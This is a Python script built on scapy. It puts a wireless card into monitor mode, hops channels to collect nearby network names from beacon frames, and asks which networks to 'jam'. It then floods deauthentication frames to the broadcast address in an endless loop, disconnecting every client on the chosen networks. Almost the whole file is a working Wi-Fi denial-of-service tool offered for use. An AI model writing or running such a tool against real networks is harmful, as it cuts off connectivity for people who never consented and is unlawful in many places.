#! /usr/bin/env python3

from scapy.all import *
from threading import Thread
import time
import os
import sys

if os.geteuid() != 0:
    print("You should run this program as root")
    sys.exit(1)

iface = 'wlan0'
networks = dict()


def monitor(mode, iface=iface):
    if mode == 'on':
        os.system('ip l set ' + iface + ' down')
        os.system('iw dev ' + iface + ' set monitor none')
        os.system('ip l set ' + iface + ' up')
        print('Monitor mode enabled on ' +iface)
    if mode == 'off':
        os.system('ip l set ' + iface + ' down')
        os.system('iw dev ' + iface + ' set type managed')
        os.system('ip l set ' + iface + ' up')
        print('Monitor mode disabled on ' +iface)

def callback_ap(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11].info.decode()
        if ssid not in networks:
            print(ssid)
            networks[ssid] = bssid

def change_channel(iface=iface):
    ch = 1
    while True:
        os.system(f"iwconfig {iface} channel {ch}")
        # switch channel from 1 to 13 each 0.5s
        ch = ch % 13 + 1
        time.sleep(0.5)

def choose_from_networks(networks=networks) -> list:
    menu_items = []
    selection = []
    for ssid in networks:
        menu_items.append(ssid)
    for i in range(len(menu_items)):
        print('{} - {}'.format(i, menu_items[i]))

    choice = str(input('Which network would you like to jam ? \nYou can specify multiple networks by separating their index by an empty space \n > '))
    for index in choice.split(' '):
        selection.append(networks[menu_items[int(index)]])
    return selection

def jam_network(ap:str, client:str, iface=iface):
    deauth_packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
    sendp(deauth_packet, iface=iface)

try :
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    monitor('on')
    sniff(prn=callback_ap, iface=iface, timeout=10)
    channel_changer.join(timeout=1)
    ap_list = choose_from_networks()
    client = 'ff:ff:ff:ff:ff:ff'
except :
    monitor('off')


try:
    while True:
        for ap in ap_list:
            jam_network(ap, client)
except KeyboardInterrupt:
    pass

monitor('off')
